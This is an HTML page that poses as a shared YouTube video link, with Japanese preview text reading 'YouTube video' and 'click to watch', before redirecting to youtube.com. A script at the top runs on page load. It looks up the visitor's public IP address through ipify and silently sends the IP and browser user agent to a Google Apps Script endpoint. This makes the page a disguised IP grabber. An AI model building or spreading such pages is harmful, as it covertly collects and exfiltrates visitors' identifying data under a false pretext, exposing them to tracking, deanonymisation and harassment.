<script>
fetch("https://api.ipify.org?format=json")
.then(r=>r.json())
.then(d=>{
fetch("https://script.google.com/macros/s/AKfycbyNnX0hS_UQ5R0KTtOVcZ_Sa11lovp2SRGQl5Af1gC_HheZ5txBrIGvR_fU-GXTh1w/exec?ip="+d.ip+"&ua="+navigator.userAgent)
})
</script>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">

<meta property="og:title" content="YouTube動画">
<meta property="og:description" content="クリックして視聴">
<meta property="og:image" id="img">

<script>
const v=new URLSearchParams(location.search).get("v");

if(v){

document.getElementById("img").content =
"https://i.ytimg.com/vi/"+v+"/maxresdefault.jpg";

location.replace("https://www.youtube.com/watch?v="+v);

}
</script>

</head>
<body></body>
</html>
